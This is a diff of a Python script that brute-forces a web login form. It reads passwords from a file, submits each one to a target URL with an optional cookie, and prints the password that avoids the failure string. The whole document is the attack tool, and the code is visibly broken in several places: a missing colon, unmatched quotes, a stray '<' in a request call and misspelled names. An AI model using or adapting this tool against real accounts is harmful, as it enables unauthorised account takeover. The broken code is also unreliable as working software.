@@ -1,7 +1,5 @@
 import requests
 
-url = input('[+]' Enter Username For the Account to Bruteforce: '')
-username = input('[+] Enter Password File to Use: ')
 
 url = input('[+] Enter Page URL: ')
 username = input('[+] Enter Username For the Account to Bruteforce: ')
@@ -11,24 +9,14 @@ cookie_value = input('Enter Cookie Value(Optional): ')
 
 
 def cracking(username, url)
-        for password in passwords:
-                password = password.strip()
-                print('Trying: ' + password)
-                data = {'username':username,'password':password,'Login':'submit''}
-                response = requests.post(url, data=data)
-                if lognin_failed_string in response.content.decode():
-                    pass
-                else:
-                    print('[+] Found Username: ==> ' + username)
-                    print('[+] Found Password: ' ==> + password)
-                    exit()
     for password in passwords:
         password = password.strip()
         print('Trying: ' + password)
         data = {'username':username,'password':password,'Login':'submit'}
-        response = requests.post(url, data=data)
         if cookie_value != '':
-            response = requests.get(url, params = {'username':username,'password':password,'Login':'Login'})
+            response = requests.get(url, params = {'username':username,'password':password,'Login':'Login'}, < cookies = {'Cookie': cookie_value})
+        else:
+            response = requests.post(url, data=data)
         if login_failed_string in response.content.decode():
             pass
         else:
